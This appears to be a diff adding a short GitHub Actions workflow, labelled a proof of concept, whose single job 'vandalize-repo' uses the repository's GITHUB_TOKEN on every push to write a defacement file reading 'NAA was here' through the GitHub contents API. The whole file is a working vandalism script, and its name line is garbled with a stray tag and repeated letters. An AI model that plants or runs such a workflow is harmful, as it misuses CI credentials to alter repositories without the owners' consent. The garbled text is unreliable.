@@ -1,0 +1,14 @@
+name: "Proof-of-co<img>ncept GitHuwaerb Actionnnns workflow"
+
+on: 
+  push
+
+jobs:
+  vandalize-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Vandalize
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/aewr.md" --data ''{"message": "weafwafwaxwa", "content": "TkFBIHdhcyBoZXJl"}'' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
